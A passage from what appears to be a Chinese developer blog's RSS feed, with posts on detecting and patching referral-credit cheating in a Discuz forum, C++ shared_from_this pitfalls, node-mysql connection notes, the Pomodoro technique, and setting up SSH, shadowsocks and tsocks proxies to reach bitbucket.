发贴、回复较少的用户具有偏高的积分、等级通常就是潜在的作弊对象。在后台查看该用户的积分历史，如果来历不明，那么很可能是通过访问推广作弊获得的。
</p>

<p>
在我们的例子里就发现有一个用户金钱数过高，先查看该用户的积分表：
</p>

<pre class="example">
mysql&gt; SELECT total, cyclenum, extcredits2 FROM g_common_credit_rule_log WHERE rid=8 and uid=119;
+-------+----------+-------------+
| total | cyclenum | extcredits2 |
+-------+----------+-------------+
|  3454 |     3454 |           1 |
+-------+----------+-------------+
1 row in set (0.00 sec)
</pre>

<p>
相关字段说明
</p>
<dl class="org-dl">
<dt>total</dt><dd>策略被执行总次数</dd>
<dt>cyclenum</dt><dd>周期被执行次数</dd>
<dt>extcredits2</dt><dd>我们的系统里对应金钱数</dd>
<dt>rid</dt><dd>值8为访问推广任务类型</dd>
<dt>uid</dt><dd>值119为作弊用户id</dd>
</dl>

<p>
从上面可以看出该用户完成了3454次任务， 接下来就需要确认这些任务是通过作弊完成的了。
</p>

<p>
搜索该用户推广链接在web服务器中留下的访问日志：
</p>
<pre class="example">
logs# grep 'fromuid=119' /usr/local/nginx/logs/access.log*
"GET /?fromuid=119.jpg HTTP/1.1" 301 6243 "http://xxxx.org/details.php?id=178668"
...
</pre>

<p>
可以初步断定，该用户通过在其它论坛中发布信息并将推广url注入到图片的url中，这样我们的站点在访问量没有任何增长的情况下该用户的推广数却瞬间彪升了。
</p></li>

<li><p>
阻止作弊
</p>

<p>
通过使用引用页中的用户标识进行记录来解决这个问题，这样只有当用户来到论坛并进行了相关操作才算推荐有效。
</p>

<p>
修改source/class/discuz/discuz_application.php文件，将下面的内容：
</p>
<div class="org-src-container">
<pre class="src src-php"><span style="color: #b5bd68;">if</span>((<span style="color: #81a2be;">!</span><span style="color: #b5bd68;">empty</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_GET</span>[<span style="color: #8abeb7;">'fromuid'</span>]) || <span style="color: #81a2be;">!</span><span style="color: #b5bd68;">empty</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_GET</span>[<span style="color: #8abeb7;">'fromuser'</span>])) &amp;&amp; (<span style="color: #81a2be;">$</span><span style="color: #81a2be;">this</span><span style="color: #c5c8c6; background-color: #1d1f21;">-&gt;</span><span style="color: #f0c674;">var</span>[<span style="color: #8abeb7;">'setti</span><span style="color: #8abeb7; text-decoration: underline;">ng'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'creditspolicy'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'promotion_visit'</span><span style="text-decoration: underline;">] || </span><span style="color: #81a2be; text-decoration: underline;">$</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">-&gt;</span><span style="color: #f0c674; text-decoration: underline;">var</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'setting'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'creditspolicy'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'promotion_register'</span><span style="text-decoration: underline;">])) {</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">require_once</span> libfile(<span style="color: #8abeb7;">'misc/promotion'</span>, <span style="color: #8abeb7;">'include'</span>);
}
</pre>
</div>
<p>
改为：
</p>
<div class="org-src-container">
<pre class="src src-php"><span style="color: #b5bd68;">if</span> (<span style="color: #b5bd68;">isset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_REFERER'</span>]) &amp;&amp; strpos(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_REFERER'</span>], <span style="color: #8abeb7;">'http://</span><span style="color: #8abeb7; text-decoration: underline;">XXX.com/'</span><span style="text-decoration: underline;">) === 0) {</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_query</span> = parse_url(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_REFERER'</span>], <span style="color: #81a2be;">PHP_URL_QUERY</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_query</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   parse_str(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_query</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_get</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>((<span style="color: #81a2be;">!</span><span style="color: #b5bd68;">empty</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_get</span>[<span style="color: #8abeb7;">'fromuid'</span>]) || <span style="color: #81a2be;">!</span><span style="color: #b5bd68;">empty</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_get</span>[<span style="color: #8abeb7;">'fromuser'</span>]))<span style="text-decoration: underline;"> &amp;&amp; (</span><span style="color: #81a2be; text-decoration: underline;">$</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">-&gt;</span><span style="color: #f0c674; text-decoration: underline;">var</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'setting'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'creditspolicy'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'promotion_visit'</span><span style="text-decoration: underline;">] || </span><span style="color: #81a2be; text-decoration: underline;">$</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">-&gt;</span><span style="color: #f0c674; text-decoration: underline;">var</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'setting'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'creditspolicy'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'promotion_register'</span><span style="text-decoration: underline;">])) {</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">require_once</span> libfile(<span style="color: #8abeb7;">'misc/promotion'</span>, <span style="color: #8abeb7;">'include'</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
}
</pre>
</div>

<p>
修改source/include/misc/misc_promotion.php文件，将下面的内容：
</p>
<div class="org-src-container">
<pre class="src src-php"><span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span><span style="color: #b5bd68;">empty</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_GET</span>[<span style="color: #8abeb7;">'fromuid'</span>])) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fromuid</span> = intval(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_GET</span>[<span style="color: #8abeb7;">'fromuid'</span>]);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fromuser</span> = <span style="color: #8abeb7;">''</span>;
} <span style="color: #b5bd68;">else</span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fromuser</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_GET</span>[<span style="color: #8abeb7;">'fromuser'</span>];
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fromuid</span> = <span style="color: #8abeb7;">''</span>;
}
</pre>
</div>
<p>
改为：
</p>
<div class="org-src-container">
<pre class="src src-php"><span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span><span style="color: #b5bd68;">empty</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_get</span>[<span style="color: #8abeb7;">'fromuid'</span>])) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fromuid</span> = intval(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_get</span>[<span style="color: #8abeb7;">'fromuid'</span>]);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fromuser</span> = <span style="color: #8abeb7;">''</span>;
} <span style="color: #b5bd68;">else</span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fromuser</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">referer_get</span>[<span style="color: #8abeb7;">'fromuser'</span>];
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fromuid</span> = <span style="color: #8abeb7;">''</span>;
}
</pre>
</div></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[为什么不能在构造函数中调用shared_from_this]]></title>
            <link>/article/4e3a4ec04e484e0d80fd57286784902051fd65704e2d8c037528-shared_from_this.html</link>
            <guid>/article/4e3a4ec04e484e0d80fd57286784902051fd65704e2d8c037528-shared_from_this.html</guid>
            <pubDate>Thu, 19 Dec 2013 17:02:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
先看示例代码：
</p>

<div class="org-src-container">
<pre class="src src-c++"><span style="color: #b5bd68;">class</span> <span style="color: #81a2be;">Chicken</span> : <span style="color: #b5bd68;">public</span> <span style="color: #81a2be;">enable_shared_from_this</span>&lt;<span style="color: #81a2be;">Chicken</span>&gt;
{
<span style="color: #b5bd68;">public</span>:
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #de935f;">Chicken</span>()
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">shared_ptr</span>&lt;<span style="color: #81a2be;">Chicken</span>&gt; <span style="color: #f0c674;">chicken_ptr</span> = shared_from_this();    <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">throw std::ba</span><span style="color: #969896; font-style: italic; text-decoration: underline;">d_weak_ptr</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
};
</pre>
</div>

<p>
再看shared_from_this()的行为：
</p>
<div class="org-src-container">
<pre class="src src-c++"><span style="color: #b5bd68;">return</span> _weak_ptr-&gt;lock();
</pre>
</div>

<p>
<code>_weak_ptr</code> 为父类（ <code>enable_shared_from_this</code> &lt;Chicken&gt;）的成员变量，需要一个 <code>shared_ptr</code> &lt;Chicken&gt;对象来初始化它，而 <code>shared_ptr</code> &lt;Chicken&gt;需要一个Chicken对象来创建，但此时Chicken对象正在构造中，这是个鸡与蛋的无解问题。
</p>

<p>
其实 <code>_weak_ptr</code> 成员变量是在 <code>shared_ptr</code> 的构造函数中延迟初始化的，不只是在构造函数中不能调用 <code>shared_from_this</code> ，像下面的使用方式同样不行：
</p>
<div class="org-src-container">
<pre class="src src-c++"><span style="color: #81a2be;">Chicken</span>* <span style="color: #f0c674;">chicken</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Chicken</span>();
<span style="color: #81a2be;">shared_ptr</span>&lt;<span style="color: #81a2be;">Chicken</span>&gt; <span style="color: #f0c674;">chicken_ptr</span> = chicken-&gt;shared_from_this();  <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">throw std::bad</span><span style="color: #969896; font-style: italic; text-decoration: underline;">_weak_ptr</span>
</pre>
</div>

<p>
<code>enable_shared_from_this</code> 不是从this祼指针变出智能指针的魔法，它只是一个辅助类，为一个只使用 <code>shared_ptr</code> 管理对象生命周期的类添加一个自身的智能指针成员变量供内部使用。
</p>

<p>
而“不能在构造函数中调用 <code>shared_from_this</code> ”这个问题仅仅是标准实现上的一个漏洞。
</p>

<p>
你应该像下面这样用：
</p>
<div class="org-src-container">
<pre class="src src-c++"><span style="color: #b5bd68;">class</span> <span style="color: #81a2be;">Chicken</span> : <span style="color: #b5bd68;">public</span> <span style="color: #81a2be;">enable_shared_from_this</span>&lt;<span style="color: #81a2be;">Chicken</span>&gt;
{
<span style="color: #b5bd68;">public</span>:
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #de935f;">Chicken</span>()
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">void</span> <span style="color: #de935f;">use</span>()
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">shared_ptr</span>&lt;<span style="color: #81a2be;">Chicken</span>&gt; <span style="color: #f0c674;">chicken_ptr</span> = shared_from_this();
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
};

<span style="color: #81a2be;">shared_ptr</span>&lt;<span style="color: #81a2be;">Chicken</span>&gt; <span style="color: #f0c674;">chicken_ptr</span>(<span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Chicken</span>);
chicken_ptr-&gt;use();
</pre>
</div>

<p>
突然想起一段对话：
</p>
<blockquote>
<p>
阿漆：闻西，事情进行的怎么样了，闻西？
</p>

<p>
达闻西： 最近我发明了些东西，相信能帮得到你。
</p>

<p>
达闻西拿出手电筒。
</p>

<p>
阿漆：手电筒？
</p>

<p>
达闻西：错，这支不是一只普通的手电筒，这支是一支不需要电池的太阳能手电筒，在有光的时候他就会亮。
</p>

<p>
司令：那如果没有光呢？
</p>

<p>
达闻西：绝对不亮。
</p>

<p>
阿漆：有没有可能没光的时候它也会亮？
</p>

<p>
达闻西：问的好，关灯。
</p>

<p>
达闻西：你拿另一只手电筒照它呢，它就会亮。
</p>

<p>
达闻西：哈哈，怎么样啊？
</p>

<p>
阿漆：这个发明还真有创意啊。
</p>
</blockquote>



<p>
参考：《<a href="http://hi.baidu.com/cpuramdisk/item/7c2f8d77385e0f29d7a89cf0">shared_from_this 几个值得注意的地方</a>》</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[node.js下访问mysql注意事项]]></title>
            <link>/article/node.js-4e0b8bbf95ee-mysql-6ce8610f4e8b9879.html</link>
            <guid>/article/node.js-4e0b8bbf95ee-mysql-6ce8610f4e8b9879.html</guid>
            <pubDate>Fri, 11 Oct 2013 02:45:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
本文仅针对 <a href="https://github.com/felixge/node-mysql">node-mysql</a> 模块。
</p>

<ul class="org-ul">
<li><p>
Connection 对象为一个到mysql的连接，在其上的query是串行进行的。
</p>

<p>
由于mysql协议类似http是串行的，在一个mysql连接上的多个query必须依次进行。
</p>

<p>
<a href="https://github.com/felixge/node-mysql">node-mysql</a> 的 Connection对象上同时发起的多个query会队列化，
</p>

<p>
处理完一个query再进行下一query的处理，传递给回调函数的query结果不会错乱。
</p>

<p>
在有一定访问量的服务中应该总是使用 <code>连接池</code> 。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
处理Connection对象的重连。
</p>

<p>
mysql连接空闲一段时间后（默认8小时）会自动关闭，
</p>

<p>
可以在Connection对象的 <code>error</code> 事件中检测后连接断开时进行重连。
</p>

<p>
使用 <code>连接池</code> 不会有问题，连接断开后会默认从连接池中剔除。</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用番茄工作法的感受]]></title>
            <link>/article/4f7f7528756a83045de54f5c6cd57684611f53d7.html</link>
            <guid>/article/4f7f7528756a83045de54f5c6cd57684611f53d7.html</guid>
            <pubDate>Mon, 08 Jul 2013 05:10:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org1176a0d" class="outline-2">
<h2 id="org1176a0d">基本要领</h2>
<div class="outline-text-2" id="text-org1176a0d">
<p>
从事务清单中选出今天要做的事
</p>

<p>
按优先级填入今日工作计划表
</p>

<p>
从表中选择第一项未完成事务按下计时器
</p>

<p>
专心做这件事
</p>

<p>
25钟后铃响立即停止做事
</p>

<p>
在当前事务后标记用掉了一个番茄
</p>

<p>
事务完成则在今日事务清单划掉当前任务
</p>

<p>
专心休息地5分钟（每4个周期长休息15-30分钟）
</p>

<p>
按下计时器
</p>

<p>
继续做事
</p>

<p>
如此往复
</p>
</div>
</div>

<div id="outline-container-org43b312d" class="outline-2">
<h2 id="org43b312d">掌控干扰因素</h2>
<div class="outline-text-2" id="text-org43b312d">
<ul class="org-ul">
<li>做事时如遇实发事件酌情处理：

<ul class="org-ul">
<li>添加到事务清单中明天再处理</li>
<li>直接安排到今日事务清单稍后处理</li>
<li>立即取消当前事务开始处理突发事件</li>
</ul></li>

<li>在当前事务后方打个中断标记</li>
</ul>
</div>
</div>

<div id="outline-container-org7a21ddb" class="outline-2">
<h2 id="org7a21ddb">解读工作记录</h2>
<div class="outline-text-2" id="text-org7a21ddb">
<p>
一天结束后我们将获得以下信息：
</p>

<ul class="org-ul">
<li>知道处理某个事务用时多少。怎样让时间用得更少？</li>

<li>知道时间花在哪里去了。能否将时间更多花在有效处理工作上？</li>
</ul>

<p>
当新的一天开始时，我们会清楚地知道每天有多少个番茄可用，今天可以安排多少事务，每个事务需要消耗多少个番茄。
</p>

<p>
随着我们不断地根据这些记录改进我们的工作效率，最终我们能够安排时间、掌控时间。
</p>
</div>
</div>

<div id="outline-container-org7e5973a" class="outline-2">
<h2 id="org7e5973a">番茄工作法遵从习惯法则</h2>
<div class="outline-text-2" id="text-org7e5973a">
<p>
当我跟老婆解释番茄工作法时，她说了句：“这个和你之前说的习惯法则很像”，细细一想不无道理。
</p>

<p>
习惯的形成的三个步骤：暗示、惯常行为、奖赏。以及习惯回路。
</p>

<p>
番茄工作法也有这三个要素：
</p>

<p>
　　暗示　　　　　　按下计时器
</p>

<p>
　　惯常行为　　　　处理事务
</p>

<p>
　　奖赏　　　　　　清脆的铃响、标记番茄的成就感、休息时间的放松
</p>

<p>
而习惯回路的形成也容易发现，每天一早来到公司，谁不渴望今天能够过得充满成就感、休息时能够毫无顾忌呢。
</p>

<p>
遵从习惯法则的方法论才会更容易展开并长久地坚持下去。
</p>
</div>
</div>

<div id="outline-container-org60590c1" class="outline-2">
<h2 id="org60590c1">参考资料</h2>
<div class="outline-text-2" id="text-org60590c1">
<p>
<a href="http://www.pomodorotechnique.com/download/pdf/ThePomodoroTechnique-CHN_v1-3.pdf">《番茄工作法》</a>
<a href="http://baike.baidu.com/view/5259318.htm">番茄工作法_百度百科</a>
<a href="http://pomodoro.kankanan.com">番茄工作法在线服务</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[《理解Node.js》培训课件]]></title>
            <link>/article/300a740689e3-node.js-300b57f98bad8bfe4ef6.html</link>
            <guid>/article/300a740689e3-node.js-300b57f98bad8bfe4ef6.html</guid>
            <pubDate>Thu, 04 Jul 2013 10:31:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
本课件介绍Node.js的特点及其初步使用。
</p>

<div id="outline-container-org8042ce4" class="outline-2">
<h2 id="org8042ce4">开发计划 <code>[1/3]</code></h2>
<div class="outline-text-2" id="text-org8042ce4">
<ul class="org-ul">
<li class="on"><code>[X]</code> 编写大纲</li>
<li class="off"><code>[&#xa0;]</code> 编写内容</li>
<li class="off"><code>[&#xa0;]</code> 制作Microsoft PowerPoint格式文档</li>
</ul>
</div>
</div>

<div id="outline-container-org361ab79" class="outline-2">
<h2 id="org361ab79">在线演示</h2>
<div class="outline-text-2" id="text-org361ab79">
<p>
<a href="http://blog.kankanan.com/slides/%E7%90%86%E8%A7%A3Node.js.html">《理解Node.js》</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux下翻墙访问bitbucket.org仓库]]></title>
            <link>/article/linux-4e0b7ffb58998bbf95ee-bitbucket.org-4ed35e93.html</link>
            <guid>/article/linux-4e0b7ffb58998bbf95ee-bitbucket.org-4ed35e93.html</guid>
            <pubDate>Fri, 28 Jun 2013 05:57:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
今天往 bitbucket.org push 时才发现 bitbucket 被 GFW 了。我的仓库为 Mercurial hg，hg 项目根目录下的 <code>.hg/hgrc</code> 配置文件中可指定 http_proxy，试了一下不支持 socks 代理（我的浏览器用它来翻墙），最终使用 tsocks 或 proxychains 实现翻墙访问 bitbucket.org 仓库。
</p>

<div id="outline-container-org5a7e801" class="outline-2">
<h2 id="org5a7e801">使用 ssh 服务代理网络访问</h2>
<div class="outline-text-2" id="text-org5a7e801">
<p>
创建本地 socks 代理的脚本 <code>ssh_proxy.sh</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #f0c674;">n</span>=<span style="color: #b294bb;">`ps waux | grep 'bash .*/ssh_proxy.sh' | grep -v grep | wc -l`</span>
<span style="color: #b5bd68;">if</span> [ $<span style="color: #f0c674;">n</span> -lt 3 ]; <span style="color: #b5bd68;">then</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">while</span> [ true ]; <span style="color: #b5bd68;">do</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">n</span>=<span style="color: #b294bb;">`ps aux | grep 'ssh' | grep '7070' | grep -v grep | wc -l`</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> [ $<span style="color: #f0c674;">n</span> -lt 1 ]; <span style="color: #b5bd68;">then</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"start ssh connecting"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   ssh -qTnNf -D 7070 user@host
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">fi</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"wait for next checking"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   sleep 30
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">done</span>
<span style="color: #b5bd68;">fi</span>
<span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"ssh_proxy.sh already running"</span>
</pre>
</div>

<p>
请将 user@host 改为你的 vps 用户及主机，并配置为免输入密码。
</p>

<p>
启动 socks 代理脚本
</p>

<div class="org-src-container">
<pre class="src src-sh">nohup bash ./ssh_proxy.sh &amp;
</pre>
</div>

<p>
通过 ssh 隧道是最简单的方式，vps 一般都会开 ssh 服务，拿来即用。
</p>
</div>
</div>

<div id="outline-container-org311b183" class="outline-2">
<h2 id="org311b183">使用 shadowsocks 服务代理网络访问</h2>
<div class="outline-text-2" id="text-org311b183">
<p>
vps 上安装并启动 shadowsocks 服务器（ss-server），配置文件 <code>/etc/shadowsocks.json</code> 内容如下
</p>
<div class="org-src-container">
<pre class="src src-json">{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"server"</span>:<span style="color: #8abeb7;">"0.0.0.0"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"server_port"</span>:<span style="color: #81a2be;">8989</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"password"</span>:<span style="color: #8abeb7;">"7FdiirqD"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"timeout"</span>:<span style="color: #81a2be;">600</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"method"</span>:<span style="color: #8abeb7;">"aes-256-cfb"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"fast_open"</span>: <span style="color: #81a2be;">false</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"workers"</span>: <span style="color: #81a2be;">1</span>
}
</pre>
</div>

<p>
<code>password</code> 请自行进行修改。
</p>

<p>
pc 上安装并启动 shadowsocks 客户端（ss-local），配置文件 <code>/etc/shadowsocks.json</code> 内容如下
</p>
<div class="org-src-container">
<pre class="src src-json">{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"server"</span>:<span style="color: #8abeb7;">"X.X.X.X"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"server_port"</span>:<span style="color: #81a2be;">8989</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"local_port"</span>:<span style="color: #81a2be;">7070</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"password"</span>:<span style="color: #8abeb7;">"7FdiirqD"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"timeout"</span>:<span style="color: #81a2be;">600</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"method"</span>:<span style="color: #8abeb7;">"aes-256-cfb"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"fast_open"</span>: <span style="color: #81a2be;">false</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"workers"</span>: <span style="color: #81a2be;">1</span>
}
</pre>
</div>

<p>
<code>server</code> 请自行修改为真正的 shadowsocks 服务器外网 IP。
</p>
</div>
</div>

<div id="outline-container-orga61d4dc" class="outline-2">
<h2 id="orga61d4dc">透明代理</h2>
<div class="outline-text-2" id="text-orga61d4dc">
<p>
firefox 可以配置为通过 socks 代理联网，但绝大多数应用是不支持的，而透明代理（Transparent Proxy）可以使这些应用也使用代理联网。
</p>
</div>

<div id="outline-container-org6d6e8b4" class="outline-3">
<h3 id="org6d6e8b4">ss-redir</h3>
<div class="outline-text-3" id="text-org6d6e8b4">
<p>
shadowsocks 自带的本地透明代理客户端，可以使整个系统都使用代理访问网络。
</p>

<p>
参考 <a href="http://manpages.org/ss-redir">man ss-redir (1): shadowsocks client as transparent proxy, libev port</a>
</p>
</div>
</div>

<div id="outline-container-org1f5b850" class="outline-3">
<h3 id="org1f5b850">tsocks</h3>
<div class="outline-text-3" id="text-org1f5b850">
<ul class="org-ul">
<li><p>
安装
</p>

<div class="org-src-container">
<pre class="src src-sh">yaourt -S tsocks
</pre>
</div></li>

<li><p>
配置
</p>

<p>
<code>/etc/tsocks.conf</code>
</p>
<pre class="example">
# We can access 192.168.0.* directly
local = 192.168.0.0/255.255.255.0
local = 10.0.0.0/255.0.0.0

# Otherwise we use the server
server = 127.0.0.1
server_port = 7070
</pre>

<p>
具体用法 <code>man tsocks.conf</code>
</p></li>

<li><p>
使用
</p>

<p>
让 hg 用上 socks 代理功能
</p>

<div class="org-src-container">
<pre class="src src-sh">tsocks hg push
</pre>
</div>

<p>
tsocks 看起来很通用，应该也可以让 git 等进行 socks 代理访问。
</p></li>
